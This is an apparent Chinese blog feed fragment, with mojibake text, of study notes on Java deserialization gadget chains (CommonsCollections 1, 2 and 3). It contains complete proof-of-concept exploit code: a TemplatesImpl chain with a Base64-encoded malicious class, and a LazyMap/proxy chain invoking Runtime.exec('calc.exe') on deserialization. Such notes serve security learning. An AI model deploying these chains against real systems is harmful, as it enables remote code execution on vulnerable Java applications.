class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc3Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getOutputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>])<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span>  <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class,transformedMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollection1ï¼ˆLazyMapï¼‰</title>
    <link href="/2022/03/04/CommonCollection1%EF%BC%88LazyMap%EF%BC%89/"/>
    <url>/2022/03/04/CommonCollection1%EF%BC%88LazyMap%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollection1ï¼ˆLazyMapï¼‰"><a href="#CommonCollection1ï¼ˆLazyMapï¼‰" class="headerlink" title="CommonCollection1ï¼ˆLazyMapï¼‰"></a>CommonCollection1ï¼ˆLazyMapï¼‰</h1><p>ä»Šå¤©å‡†å¤‡å¤ä¹ cc3ï¼Œä½†æ˜¯æƒ³åˆ°å…¶å®cc3æ˜¯cc2å’Œcc1çš„ç»“åˆã€‚ç„¶åé‚£æ—¶å€™éƒ½å¿˜è®°å¤ä¹ cc1çš„å¦å¤–ä¸€æ¡é“¾å­äº†ã€‚</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">objectInputStream.read<span class="hljs-constructor">Object()</span><br> <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span>                     <br></code></pre></td></tr></table></figure><p>å˜å¾—æ— éå°±æ˜¯ **TransformedMap.setValue()<strong>è¿™ä¸€æ­¥å˜æˆäº†ï¼Œ</strong>LazyMap.get()**ï¼ŒLazyMapè¿™é‡Œç›¸å¯¹æ¥è¯´æ›´ç¹çä¸€äº›ã€‚<br>é€ä¸ªåˆ†æã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041849264.png" alt="QQæˆªå›¾20220304184908"></p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap()"></a>LazyMap()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041833631.png" alt="QQæˆªå›¾20220304183257"></p><p>å…¶ä¸­çš„getæ–¹æ³•è°ƒç”¨äº†<strong>transform</strong>ï¼Œåç»­è·Ÿtransformä¸€æ ·ã€‚<br>çœ‹ä¸€ä¸‹<strong>factory</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041903384.png" alt="QQæˆªå›¾20220304183440"></p><p>å¯æ§ã€‚é‚£ä¹ˆç°åœ¨å°±è¦æ‰¾å“ªé‡Œè°ƒç”¨äº†<strong>getï¼ˆï¼‰</strong>æ–¹æ³•ã€‚</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>å…¶ä¸­çš„<strong>invoke</strong>åˆšå¥½è°ƒç”¨äº†<strong>get</strong>æ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041837323.png" alt="QQæˆªå›¾20220304183737"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„<strong>menberValues</strong>ï¼Œä¹Ÿæ˜¯å¯æ§çš„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041903317.png" alt="QQæˆªå›¾20220304183835"></p><p>åœ¨æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯è¿™é‡Œç»§æ‰¿äº†<strong>InvocationHandler</strong>ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203041839966.png" alt="QQæˆªå›¾20220304183700"></p><p>é‚£ä¹ˆè¦è°ƒç”¨è¿™é‡Œçš„<strong>invoke</strong>å°±è½»è€Œæ˜“ä¸¾äº†ã€‚ç›´æ¥ä¸€æ³¢åŠ¨æ€ä»£ç†ã€‚è‡³äºåŠ¨æ€ä»£ç†emmmä¹‹å‰å¤ä¹ æ–‡ç« æœ‰ã€‚å˜¿å˜¿ã€‚</p><h3 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h3><p>ä»£ç†åçš„å¯¹è±¡å«åšproxyMapï¼Œä½†ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºå…¥å£ç‚¹æ˜¯sun.reflect.annotation.AnnotationInvocationHandler#readObjectï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†ç”¨AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapè¿›è¡ŒåŒ…è£¹ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1DemoTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> LazyMap.decorate(objectObjectHashMap, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, decorate);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, (InvocationHandler) o);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, proxyMap);<br>        serialize(o1);<br>        unserialize(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JaveWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections2</title>
    <link href="/2022/03/03/CommonsCollections2/"/>
    <url>/2022/03/03/CommonsCollections2/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><p>å¦‚æœCC1ç†è§£çš„å¾ˆå……åˆ†ï¼Œç†è§£CC2å°±è·Ÿç©ä¸€æ ·ã€‚</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br> <br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235712.png" 